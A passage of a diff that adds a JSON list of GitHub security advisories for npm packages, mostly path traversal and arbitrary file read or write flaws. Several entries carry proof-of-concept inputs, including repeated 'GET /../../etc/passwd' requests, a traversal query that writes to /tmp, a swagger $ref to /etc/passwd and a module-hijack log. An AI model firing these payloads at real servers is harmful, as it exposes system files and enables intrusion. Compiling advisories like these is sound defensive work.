t, n) {\n    module.exports = () => console.log(\"pwned\");\n  }\n});\nWebpackBundle {\n  type: 'webpack',\n  entryId: '386',\n  modules: Map(1) {\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index' => WebpackModule {\n      id: './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index',\n      isEntry: false,\n      path: '././\\\\..\\\\node_modules\\\\debug\\\\src\\\\index.js',\n      ast: [Object]\n    }\n  }\n}\nWaiting for the debugger to disconnect...\nPS C:\\Webcrack> node .\\index.js\nDebugger attached.\npwned\npwned\npwned\npwned\npwned\npwned\npwned\nWaiting for the debugger to disconnect...\nfile:///C:/Webcrack/node_modules/webcrack/dist/index.js:444\n  if (options.log) logger(`${name}: started`);\n                   ^\n\nTypeError: logger is not a function\n    at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)\n    at Array.<anonymous> (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)\n    at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)\n    at async file:///C:/Webcrack/index.js:6:16\n\nNode.js v18.16.0\n```\n\nThis demonstrates that the debug module was successfully overwritten and hijacked to print `pwned` to the console, confirming the arbitrary file write vulnerability has lead to code execution.\n\n### Impact\nThis vulnerability allows an attacker to write arbitrary `.js` files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.\n",
+      "summary": "webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle",
+      "date": "2024-08-14T18:01:06Z",
+      "cve": "CVE-2024-43373",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@nuxt/devtools@1.3.8",
+         "name": "devtools",
+         "version": "1.3.8",
+         "scope": "nuxt"
+      },
+      "id": "GHSA-rcvg-rgf7-pppv",
+      "description": "### Summary\nNuxt Devtools is missing authentication on the `getTextAssetContent` RPC function which is vulnerable to path traversal.  Combined with a lack of Origin checks on the WebSocket handler,  an attacker is able to interact with a locally running devtools instance and exfiltrate data abusing this vulnerability. \n\nIn certain configurations an attacker could leak the devtools authentication token and then abuse other RPC functions to achieve RCE. \n\n### Details\nThe `getTextAssetContent` function does not check for path traversals [(source)](https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L88C48-L88C48), this could allow an attacker to read arbitrary files over the RPC WebSocket. \n\nThe WebSocket server does not check the origin of the request [(source)](https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/index.ts#L109) leading to [CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking). This may be intentional to allow certain configurations to work correctly.\n\nNuxt Devtools authentication tokens are placed within the home directory of the current user  [(source)](https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/dev-auth.ts#L14).\n\nIn the scenario that:\n + The user has a Nuxt3 Project running\n + Devtools is enabled and running\n + The project is placed within the users home directory.\n + The user visits a malicious webpage\n + User has authenticated with devtools at least once\n\nThe malicious webpage can connect to the Devtools WebSocket, perform a directory traversal brute force to find the authentication token, then use the *authenticated* [`writeStaticAssets` function](https://github.com/nuxt/devtools/blob/c4f2b68281203fc3f61ffc97d9c6623fbfde46bb/packages/devtools/src/server-rpc/assets.ts#L96C11-L96C28) to create a new Component, Nitro Handler or `app.vue` file which will run automatically as the file is changed.\n\n### PoC\nPOC will exploit the Devtools server on localhost:3000 (you may need to manually restart the server as the restart hook does not always work).\n\nPOC: https://devtools-exploit.pages.dev\n\n1. Create a new project with nuxt.new.\n2. Place the project inside your home directory.\n3. Run `pnpm run dev`.\n4. Open the POC page.\n\nThe POC will:\n+ Identify devtools version.\n+ Leak your devtools token.\n+ Create a new server handler with an insecure eval.\n\n### Impact\n+ All new Nuxt projects by default (devtools is enabled) are vulnerable to arbitrary file read.\n+ Certain Nuxt configurations are vulnerable to Remote Code Execution\n",
+      "summary": "Nuxt Devtools has a Path Traversal: '../filedir'",
+      "date": "2024-08-05T19:48:56Z",
+      "cve": "CVE-2024-23657",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@jmondi/url-to-png@2.1.0",
+         "name": "url-to-png",
+         "version": "2.1.0",
+         "scope": "jmondi"
+      },
+      "id": "GHSA-vvmv-wrvp-9gjr",
+      "description": "### Summary\nWhen trying to add a `BLOCK_LIST` feature when the maintainer noticed they didn't sanitize the `ImageId` in the code, which leads to path traversal vulnerability. Now, this is different from a traditional path traversal issue, because as of NOW you can store the image in any place arbitrarily, and given enough time they might be able to come up with a working exploit BUT for the time being they am reporting this.  \n\n### Details\n\n@jmondi/url-to-png does not sanitizing the `ImageID` as in not removing special chars from the params [(extract_query_params.ts#l75)](https://github.com/jasonraimondi/url-to-png/blob/e43098e0af3a380ebc044e7f303a83933b94b434/src/middlewares/extract_query_params.ts#L75)\n\n```js\nconst imageId = dateString + \".\" + slugify(validData.url) +configToString(params);\n```\n\nThis when fed to other parts of the code such as ([filesystem.ts#L34](https://github.com/jasonraimondi/url-to-png/blob/8afc00247c1d7e6c7b37356a5f6282b486e596fa/src/lib/storage/filesystem.ts#L34))\n\n```js\nreturn path.join(this.storagePath, imageId) + \".png\";\n```\n\nWould result in path traversal issue. \n\n### PoC\n\n```\n# Configuration for filesystem storage provider (optional)\nSTORAGE_PROVIDER=filesystem\nIMAGE_STORAGE_PATH=poc\n```\n\nSet this in your `.env` file and use this as your payload. \n\n```\nhttp://localhost:3089/?url=http://example.com&width=400&isDarkMode=../../../../../../../../../../../../tmp/hack\n```\n\nThis will create a `.png` file in the `/tmp` section of the system.\n\nLoom POC: https://www.loom.com/share/bd7b306cdae7445c97e68f0626e743a6 \n\n\n\nThis is valid for pretty much all the arguments (except for numeric values)\n\nA simple fix would be to use the `slugify` for the params as well like so ([#L75](https://github.com/jasonraimondi/url-to-png/blob/e43098e0af3a380ebc044e7f303a83933b94b434/src/middlewares/extract_query_params.ts#L75))\n\n```diff\n- const imageId = dateString + \".\" + slugify(validData.url) + configToString(params);\n+ const imageId = dateString + \".\" + slugify(validData.url) + slugify(configToString(params));\n```\n\n\n### Impact\nThis would be path traversal vulnerability which allows arbitrary write as of now. \n",
+      "summary": "@jmondi/url-to-png contains a Path Traversal vulnerability",
+      "date": "2024-07-15T17:46:57Z",
+      "cve": "CVE-2024-39918",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "dasafio@1.2.0",
+         "name": "dasafio",
+         "version": "1.2.0"
+      },
+      "id": "GHSA-8xj3-7258-w4q2",
+      "description": "Affected versions of `dasafio` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in dasafio",
+      "date": "2020-09-01T18:51:22Z",
+      "cve": "CVE-2017-16179",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "iter-server@1.0.0",
+         "name": "iter-server",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-qh38-wrgf-cj2c",
+      "description": "Affected versions of `iter-server` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in iter-server",
+      "date": "2020-09-01T18:48:05Z",
+      "cve": "CVE-2017-16183",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "scott-blanch-weather-app@1.0.0",
+         "name": "scott-blanch-weather-app",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-jp46-fw6c-3pm9",
+      "description": "Affected versions of `scott-blanch-weather-app` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in scott-blanch-weather-app",
+      "date": "2020-09-01T18:46:58Z",
+      "cve": "CVE-2017-16184",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "360class.jansenhm@0.1.1",
+         "name": "360class.jansenhm",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-25jw-gcfj-283j",
+      "description": "Affected versions of `360class.jansenhm` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in 360class.jansenhm",
+      "date": "2020-09-01T18:27:04Z",
+      "cve": "CVE-2017-16186",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "yttivy@1.0.0",
+         "name": "yttivy",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-96qc-ghj4-rq27",
+      "description": "Affected versions of `yttivy` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in yttivy",
+      "date": "2020-09-01T18:24:56Z",
+      "cve": "CVE-2017-16219",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "qinserve@1.0.0",
+         "name": "qinserve",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-cxwc-8pqp-2whw",
+      "description": "Affected versions of `qinserve` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in qinserve",
+      "date": "2020-09-01T18:20:40Z",
+      "cve": "CVE-2017-16197",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "uv-tj-demo@1.0.0",
+         "name": "uv-tj-demo",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-m362-87jc-f39v",
+      "description": "Affected versions of `uv-tj-demo` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in uv-tj-demo",
+      "date": "2020-09-01T18:16:24Z",
+      "cve": "CVE-2017-16200",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "dmmcquay.lab6@0.1.1",
+         "name": "dmmcquay.lab6",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-ccw5-7vfh-p5hm",
+      "description": "Affected versions of `dmmcquay.lab6` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in dmmcquay.lab6",
+      "date": "2020-09-01T18:14:15Z",
+      "cve": "CVE-2017-16208",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "enserver@1.0.0",
+         "name": "enserver",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-5c6f-jpx7-cwq6",
+      "description": "Affected versions of `enserver` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in enserver",
+      "date": "2020-09-01T18:13:11Z",
+      "cve": "CVE-2017-16209",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "tencent-server@0.0.2",
+         "name": "tencent-server",
+         "version": "0.0.2"
+      },
+      "id": "GHSA-rr77-w4w8-w8wp",
+      "description": "Affected versions of `tencent-server` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in tencent-server",
+      "date": "2020-09-01T17:37:46Z",
+      "cve": "CVE-2017-16216",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "hcbserver@1.0.0",
+         "name": "hcbserver",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-mwj7-r5vc-hmc9",
+      "description": "Affected versions of `hcbserver` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in hcbserver",
+      "date": "2020-09-01T17:35:38Z",
+      "cve": "CVE-2017-16171",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "nodeload-nmickuli@1.0.3",
+         "name": "nodeload-nmickuli",
+         "version": "1.0.3"
+      },
+      "id": "GHSA-wmcq-3wfx-qjx5",
+      "description": "Affected versions of `nodeload-nmickuli` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\nExample request:\n```\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in nodeload-nmickuli",
+      "date": "2020-09-01T17:33:30Z",
+      "cve": null,
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "dcserver@1.0.0",
+         "name": "dcserver",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-fg6m-q92x-vv38",
+      "description": "Affected versions of `dcserver` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in dcserver",
+      "date": "2020-09-01T17:26:00Z",
+      "cve": "CVE-2017-16158",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "earlybird@0.1.7",
+         "name": "earlybird",
+         "version": "0.1.7"
+      },
+      "id": "GHSA-qpwf-4fx5-crqq",
+      "description": "Affected versions of `earlybird` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in earlybird",
+      "date": "2020-09-01T17:19:36Z",
+      "cve": "CVE-2017-16154",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "weather.swlyons@0.1.6",
+         "name": "weather.swlyons",
+         "version": "0.1.6"
+      },
+      "id": "GHSA-2r4h-2ghh-5hpx",
+      "description": "Affected versions of `weather.swlyons` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in weather.swlyons",
+      "date": "2020-09-01T17:18:33Z",
+      "cve": "CVE-2017-16110",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "tiny-http@2.0.8",
+         "name": "tiny-http",
+         "version": "2.0.8"
+      },
+      "id": "GHSA-cch6-5x4h-6qc5",
+      "description": "Affected versions of `tiny-http` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in tiny-http",
+      "date": "2020-09-01T16:46:04Z",
+      "cve": "CVE-2017-16097",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "xtalk@0.0.7",
+         "name": "xtalk",
+         "version": "0.0.7"
+      },
+      "id": "GHSA-cqv6-7fwc-8m3c",
+      "description": "Affected versions of `xtalk` are vulnerable to directory traversal, allowing access to the filesystem by placing \"../\" in the URL.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:localhost\n```\n\n\n\n\n## Recommendation\n\nNo patch is currently available for this vulnerability, and the package has not been updated since 2014.\n\nThe best mitigation is currently to avoid using this package, and using a different, functionally equivalent package.",
+      "summary": "Directory Traversal in xtalk",
+      "date": "2020-09-01T16:44:59Z",
+      "cve": "CVE-2017-16091",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "fury-adapter-swagger@0.9.6",
+         "name": "fury-adapter-swagger",
+         "version": "0.9.6"
+      },
+      "id": "GHSA-2r7f-4h2c-5x73",
+      "description": "`fury-adapter-swagger` from version 0.2.0 until version 0.9.7 has a weakness that allows an attacker to read arbitrary files off of the system. This can be used to read sensitive data, or to cause a denial of service condition by attempting to read something like `/dev/zero`.\n\n## Proof of Concept:\n\n```yaml\n---\nswagger: '2.0'\ninfo:\n  title: Read local files\n  version: '1.0'\n\npaths:\n  /foo:\n    get:\n      responses:\n        200:\n          description: Some description\n          examples:\n            text/html:\n              example:\n                $ref: '/etc/passwd'\n```\n\n\n## Recommendation\n\nUpgrade to version 0.9.7 or later.",
+      "summary": "fury-adapter-swagger allows arbitrary file read from system",
+      "date": "2020-09-01T16:38:33Z",
+      "cve": "CVE-2016-1000249",
+      "year": 2016
+   },
+   {
+      "package": {
+         "raw": "st@0.2.4",
+         "name": "st",
+         "version": "0.2.4"
+      },
+      "id": "GHSA-69rr-wvh9-6c4q",
+      "description": "Versions of `st` prior to 0.2.5 are affected by a directory traversal vulnerability. Vulnerable versions fail to properly handle URL encoded dots, which caused `%2e` to be interpreted as `.` by the filesystem, resulting the potential for an attacker to read sensitive files on the server.\n\n\n## Recommendation\n\nUpdate to version 0.2.5 or later.",
+      "summary": "Directory Traversal in st",
+      "date": "2020-08-31T22:58:04Z",
+      "cve": "CVE-2014-3744",
+      "year": 2014
+   },
+   {
+      "package": {
+         "raw": "inert@1.1.0",
+         "name": "inert",
+         "version": "1.1.0"
+      },
+      "id": "GHSA-g4xp-36c3-f7mr",
+      "description": "Versions 1.1.1 and earlier of `inert` are vulnerable to an information leakage vulnerability which causes files in hidden directories to be served, even when showHidden is false.\n\nThe inert directory handler always allows files in hidden directories to be served, even when `showHidden` is false.\n\n\n## Recommendation\n\nUpdate to version >= 1.1.1.",
+      "summary": "Hidden Directories Always Served in inert",
+      "date": "2020-08-31T22:47:41Z",
+      "cve": "CVE-2014-10068",
+      "year": 2014
+   },
+   {
+      "package": {
+         "raw": "fancy-server@0.1.3",
+         "name": "fancy-server",
+         "version": "0.1.3"
+      },
+      "id": "GHSA-m273-wwfv-h6jp",
+      "description": "Versions 0.1.4 and earlier of fancy-server are vulnerable to a directory traversal attack. \n\nStandard attack vectors such as `../` will allow an attacker to read files outside of the served directory.\n\n\n## Recommendation\n\nUpgrade to version 0.1.4 or greater.",
+      "summary": "Directory Traversal in fancy-server",
+      "date": "2020-08-31T22:44:33Z",
+      "cve": "CVE-2014-10066",
+      "year": 2014
+   },
+   {
+      "package": {
+         "raw": "socket.io-file@2.0.31",
+         "name": "socket.io-file",
+         "version": "2.0.31"
+      },
+      "id": "GHSA-9h4g-27m8-qjrg",
+      "description": "All versions of `socket.io-file` are vulnerable to Path Traversal. The package fails to sanitize user input and uses it to generate the file upload paths. The `socket.io-file::createFile` message contains a `name` option that is passed directly to `path.join()`.   It is possible to upload files to arbitrary folders on the server by sending relative paths on the `name` value, such as `../../test.js`.  The `uploadDir` and `rename` options can be used to define the file upload path.",
+      "summary": "Path Traversal in socket.io-file",
+      "date": "2020-07-07T19:24:47Z",
+      "cve": "CVE-2020-15779",
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "snyk-broker@4.79.1",
+         "name": "snyk-broker",
+         "version": "4.79.1"
+      },
+      "id": "GHSA-x7m2-6g99-84w5",
+      "description": "All versions of snyk-broker before 4.80.0 are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users with access to Snyk's internal network via directory traversal.",
+      "summary": "Arbitrary File Read in Snyk Broker",
+      "date": "2020-06-03T22:02:24Z",
+      "cve": "CVE-2020-7652",
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "snyk-broker@4.72.1",
+         "name": "snyk-broker",
+         "version": "4.72.1"
+      },
+      "id": "GHSA-9xv2-548x-5h79",
+      "description": "All versions of snyk-broker before 4.72.2 are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users who have access to Snyk's internal network by appending the URL with a fragment identifier and a whitelisted path e.g. `#package.json`",
+      "summary": "Arbitrary File Read in Snyk Broker",
+      "date": "2020-06-03T22:02:19Z",
+      "cve": "CVE-2020-7648",
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "snyk-broker@4.73.0",
+         "name": "snyk-broker",
+         "version": "4.73.0"
+      },
+      "id": "GHSA-2fmp-7xwf-wvwr",
+      "description": "All versions of snyk-broker after 4.72.0 including and before 4.73.1 are vulnerable to Arbitrary File Read. It allows arbitrary file reads to users with access to Snyk's internal network of any files ending in the following extensions: yaml, yml or json.",
+      "summary": "Arbitrary File Read in Snyk Broker",
+      "date": "2020-06-03T22:02:16Z",
+      "cve": "CVE-2020-7650",
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "snyk-broker@4.78.0",
+         "name": "snyk-broker",
+         "version": "4.78.0"
+      },
+      "id": "GHSA-45hw-29x7-9x95",
+      "description": "All versions of snyk-broker before 4.79.0 are vulnerable to Arbitrary File Read. It allows partial file reads for users who have access to Snyk's internal network via patch history from GitHub Commits API.",
+      "summary": "Arbitrary File Read in Snyk Broker",
+      "date": "2020-06-03T22:02:11Z",
+      "cve": "CVE-2020-7651",
+      "year": 2020
+   },
+   {
+      "package": {
+         "raw": "http_server@1.0.12",
+         "name": "http_server",
+         "version": "1.0.12"
+      },
+      "id": "GHSA-754x-4jwp-cqp6",
+      "description": "All versions of `http_server` are vulnerable to Cross-Site Scripting (XSS). The package fails to sanitize filenames, allowing attackers to execute arbitrary JavaScript in the victim's browser through files with names containing malicious code.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+      "summary": "Cross-Site Scripting in http_server",
+      "date": "2020-03-31T17:02:26Z",
+      "cve": "CVE-2019-15600",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "npm@6.13.3",
+         "name": "npm",
+         "version": "6.13.3"
+      },
+      "id": "GHSA-4328-8hgf-7wjr",
+      "description": "Versions of  the npm CLI prior to 6.13.4 are vulnerable to a Global node_modules Binary Overwrite. It fails to prevent existing globally-installed binaries to be overwritten by other package installations. \n\nFor example, if a package was installed globally and created a `serve` binary, any subsequent installs of packages that also create a `serve` binary would overwrite the first binary. This will not overwrite system binaries but only binaries put into the global node_modules directory.\n\nThis behavior is still allowed in local installations and also through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.\n\n\n## Recommendation\n\nUpgrade to version 6.13.4 or later.",
+      "summary": "npm Vulnerable to Global node_modules Binary Overwrite",
+      "date": "2019-12-13T15:39:32Z",
+      "cve": "CVE-2019-16777",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "npm@6.13.2",
+         "name": "npm",
+         "version": "6.13.2"
+      },
+      "id": "GHSA-x8qc-rrcw-4r46",
+      "description": "Versions of the npm CLI prior to 6.13.3 are vulnerable to a symlink reference outside of node_modules. It is possible for packages to create symlinks to files outside of the`node_modules` folder through the `bin` field upon installation. A properly constructed entry in the package.json bin field would allow a package publisher to create a symlink pointing to arbitrary files on a user’s system when the package is installed. Only files accessible by the user running the `npm install` are affected.  \n\nThis behavior is still possible through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.\n\n\n## Recommendation\n\nUpgrade to version 6.13.3 or later.",
+      "summary": "npm symlink reference outside of node_modules",
+      "date": "2019-12-13T15:39:26Z",
+      "cve": "CVE-2019-16776",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "iobroker.js-controller@1.5.14",
+         "name": "iobroker.js-controller",
+         "version": "1.5.14"
+      },
+      "id": "GHSA-cmch-296j-wfvw",
+      "description": "Versions of `iobroker.controller` prior to 2.0.25 are vulnerable to Path Traversal. The package fails to restrict access to folders outside of the intended `/adapter/<adapter-name>` folder, which may allow attackers to include arbitrary files in the system. An attacker would need to be authenticated to perform the attack but the package has authentication disabled by default.\n\n\n## Recommendation\n\nUpgrade to version 2.0.25 or later.",
+      "summary": "Arbitrary File Write in iobroker.js-controller",
+      "date": "2019-12-02T18:06:14Z",
+      "cve": "CVE-2019-10767",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "bower@1.8.7",
+         "name": "bower",
+         "version": "1.8.7"
+      },
+      "id": "GHSA-p6mr-pxg4-68hx",
+      "description": "Versions of `bower` prior to 1.8.8 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `bower` does not verify that extracted symbolic links do not resolve to targets outside of the extraction root directory.\n\n\n\n## Recommendation\n\nUpdate to version 1.8.8 or later",
+      "summary": "Symlink Arbitrary File Overwrite in bower",
+      "date": "2019-09-17T23:21:34Z",
+      "cve": "CVE-2019-5484",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "algo-httpserv@1.1.1",
+         "name": "algo-httpserv",
+         "version": "1.1.1"
+      },
+      "id": "GHSA-cgjv-rghq-qhgp",
+      "description": "Versions of `algo-httpserv` prior to 1.1.2 are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nUpgrade to version 1.1.2 or later.",
+      "summary": "Path Traversal in algo-httpserv",
+      "date": "2019-09-11T23:00:57Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "serve-here@3.2.0",
+         "name": "serve-here",
+         "version": "3.2.0"
+      },
+      "id": "GHSA-g8m7-qhv7-9h5x",
+      "description": "Versions of `serve-here.js` prior to 1.2.0 are vulnerable to Path Traversal. The package fails to sanitize URLs, allowing attackers to access server files outside of the served folder using relative paths.\n\n\n## Recommendation\n\nUpgrade to version 1.2.0 or later.",
+      "summary": "Path Traversal in serve-here.js",
+      "date": "2019-07-05T21:07:14Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "lactate@0.13.12",
+         "name": "lactate",
+         "version": "0.13.12"
+      },
+      "id": "GHSA-68gr-cmcp-g3mj",
